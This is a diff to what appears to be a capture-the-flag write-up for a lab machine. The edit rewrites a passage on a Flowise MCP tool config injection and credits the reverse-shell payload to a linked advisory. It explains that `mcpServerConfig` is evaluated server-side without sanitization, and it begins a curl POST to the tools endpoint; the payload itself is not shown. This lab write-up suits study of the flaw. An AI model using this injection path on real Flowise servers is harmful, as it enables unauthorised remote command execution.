@@ -176,9 +176,7 @@ This returned `HTTP/1.1 200 Created`. I logged in with `ben@silentium.htb` / `Bi
 
 Flowise's MCP Server tool configuration accepts a JSON object that gets evaluated server-side. The `mcpServerConfig` field is passed into a JavaScript `eval()`-like function without sanitization. By embedding a self-executing function inside the config value, we can make the server run any system command.
 
-### Crafting the Payload
-
-I constructed the following reverse shell payload targeting Flowise's MCP tool endpoint. The payload uses Node.js's built-in `child_process` module to spawn a reverse shell:
+I found the following reverse shell [payload](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p) targeting Flowise's MCP tool endpoint. The payload uses Node.js's built-in `child_process` module to spawn a reverse shell:
 
 ```bash
 curl -s -X POST http://staging.silentium.htb/api/v1/tools \
